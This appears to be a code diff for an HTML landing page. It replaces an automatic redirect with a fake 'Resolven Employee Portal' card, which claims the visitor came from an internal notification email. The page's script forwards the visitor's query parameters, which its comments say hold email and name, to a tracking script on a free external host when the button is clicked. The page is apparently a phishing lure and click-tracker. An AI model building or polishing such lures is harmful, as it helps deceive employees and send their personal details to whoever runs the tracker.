@@ -1,13 +1,39 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Redirecting...</title>
-    <meta http-equiv="refresh" content="0;url=https://resolven.infinityfree.io/track.php<?php echo htmlspecialchars($_SERVER['QUERY_STRING'] ?? ''); ?>">
-    <script>
-        window.location.replace("https://resolven.infinityfree.io/track.php" + window.location.search);
-    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Resolven Employee Portal</title>
+    <style>
+        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f8fafc; color: #334155; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #ffffff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); max-width: 450px; width: 100%; text-align: center; border: 1px solid #e2e8f0; }
+        h2 { color: #0f172a; margin-bottom: 10px; font-size: 22px; }
+        p { color: #64748b; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
+        .btn { display: inline-block; background-color: #0284c7; color: #ffffff; padding: 12px 24px; border-radius: 6px; text-decoration: none; font-weight: 600; font-size: 14px; transition: background 0.2s; }
+        .btn:hover { background-color: #0369a1; }
+        .footer { margin-top: 20px; font-size: 12px; color: #94a3b8; }
+    </style>
 </head>
 <body>
+
+    <div class="card">
+        <h2>Resolven Company Portal</h2>
+        <p>You have been redirected from an internal notification email. Click below to access your secure portal dashboard and view the latest announcements.</p>
+        
+        <!-- Clickable button jo query parameters ko secure tareeke se aage pass karega -->
+        <a href="#" id="portalLink" class="btn">Access Portal Dashboard</a>
+        
+        <div class="footer">Resolven Internal Network &copy; 2026</div>
+    </div>
+
+    <script>
+        // Query parameters (jaise email aur name) ko capture karke safe tarike se destination par bhejega jab user click karega
+        window.addEventListener('DOMContentLoaded', (event) => {
+            const queryString = window.location.search;
+            const targetUrl = "https://resolven.infinityfree.io/track.php" + queryString;
+            document.getElementById('portalLink').setAttribute('href', targetUrl);
+        });
+    </script>
+
 </body>
 </html>
